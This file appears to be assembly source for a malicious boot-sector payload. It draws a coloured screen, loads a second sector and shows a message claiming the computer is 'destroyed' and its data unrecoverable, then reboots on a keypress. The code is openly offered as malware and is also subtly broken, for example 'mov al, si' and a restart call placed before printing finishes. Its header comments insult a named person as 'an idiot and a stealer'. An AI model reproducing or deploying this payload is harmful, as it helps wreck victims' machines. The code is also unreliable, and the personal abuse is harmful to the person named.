; PRO tip: Andrej Akan (known as Leurak Vinesauce, jjjj, First Blood, Janus)
; or whatever else you rename yourself to make you look important
; you are an idiot and a stealer.

; otherwise if you are not this one, feel free to ask me any question.
; also the code is a bit wrong, so i want people me open commits.

; want the fixed, sure, ask me.

BITS 16 ; we are working in real mode
org 0x7c00 ; BIOS magic number

start:

; screen preparation
; segments

	  mov ax,0x002  ; 80x25x16 colors
    int 0x10      ; video mode  
    cld           ; clear interupts
   
;bg drawing part

; color stuff "only the text for now"
	  mov ah, 07h 
    mov al, 0x00
    mov bh, 0x0C ;color values
    mov cx, 0x0000
    mov dx, 0x184f
    int 0x10
	
  ; double lines
  ; -------------------------
  ; al = lines to scroll
  ; bh* = background and foreground color 
  ; ch = upper row number 
  ; cl = left column number
  ; dh = lower row number
  ; dl = right column number

	  mov ah, 6   
  	mov al, 1
    mov bh, 01000000b
    mov ch, 0
    mov cl, 0
    mov dh, 0
    mov dl, 80
	  int 0x10

	; the next one
    mov ah, 6              
    mov al, 1             
    mov bh, 01000000b     
    mov ch, 22              
    mov cl, 0              
    mov dh, 24              
    mov dl, 80            
    int 0x10
  ; -------------------------

	; cursor pos to set up the first text
  ; remember! -> bh=page number dh=row dl=column
	  mov ah,0x02 ; cursor mode
   	mov bh,0x00
	  mov dh,0x00
	  mov dl,0x15
	  int 0x10

; allow me use 16 colors, not only 8.
blinking_attr:
    ; turn-off blinking attribute
    mov ax, 1003h       
    mov bl, 00
    int 0x10
	
nextsector:  ;reading the next sector for the message
	
	mov ah, 0x02                    ; load second stage to memory
	mov al, 2                       ; numbers of sectors to read into memory
	mov dl, 0x80                    ; sector read from fixed/usb disk
	mov ch, 2                       ; cylinder number
	mov dh, 2                       ; head number
	mov cl, 2                       ; sector number
	mov bx, Kernel                  ; load into es:bx segment :offset of buffer
	int 0x13                        ; disk I/O interrupt

	jmp Kernel                      ; jump to second stage

; nothing, jump to kernel (next sector) 
; we finished the bootloader, so as the text won't fit in 512 bytes
; we will use another one.

times 510 - ($-$$) db 0 ; fill the rest of the unused bytes with 0 for 510 times
dw 0xaa55 ; write bootloader signature, to make it booteable

Kernel:

; text data is here

mov si, text     ; declare our text

print_str:
    push ax
    push di
    mov ah, 0x0E ; teletype function
.getchar:
    mov al, si   ; move our byte al to 'si', were our text is alloc                    
    inc si       ; increment next byte in order to read the next char
    cmp al, 0    ; compare if the byte is 0, if is, stop printing, else, continue             
    jz .end      
    int 0x10     ; video interrupt
    jmp .getchar
.end:
    pop di
    pop ax
    ; once done, set up the keyboard, and clear all the junk that has been running before.
          call restartpc
	        hlt

	call print_str

text db "   Your computer now is destroyed.",13,10,13,10,13,10," You maybe wont care. You may probably run this in VM, in physical.",13,10," is a bad idea...",13,10,13,10," If you read this text, congrats, enjoy your new PC.",13,10," Also you must know, there is no chance for a way back on your data.",13,10,13,10," At least, thank you for reading, and understand this.",13,10,13,10," Creators: DesConnet, Noimage PNG, SleepMod, AngryCow, HackerV",13,10,13,10,13,10," Press any key if want restart your computer...",13,10,13,10,13,10,13,10,13,10,13,10,13,10,13,10,13,10,13,10," This message will be displayed only 1 time, after restart, it won't display!",0

restartpc:

; wait for key press & restart
	mov ax, 0 ; get key input
	int 0x16  ; keyboard input
  ; once pressed
	int 0x19  ; restart computer interrupt
	
times 1120 - ($-$$) db 0 : exactly the bytes i need for this, becuase its +512 bytes of text

;*
  ; tip: if you are using 80x25 use binary mode
  ; for 320x200 use hexadecimal, will be more easy
  
 ; any issue? comment in the video and i wll take a look, or open a commit!
